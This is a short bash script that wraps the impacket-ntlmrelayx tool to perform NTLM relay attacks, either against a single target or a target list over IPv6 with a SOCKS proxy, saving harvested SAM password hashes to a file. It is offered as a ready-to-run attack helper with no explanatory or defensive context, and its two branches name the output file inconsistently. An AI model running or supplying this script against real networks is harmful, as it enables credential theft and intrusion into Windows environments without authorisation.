#!/bin/bash
if [ -f "$2" ]; then
    impacket-ntlmrelayx -of SAMhashes -6 -tf "$2" -socks -smb2support
else
    impacket-ntlmrelayx  -of SAMHashes -t "$2" -smb2support
fi
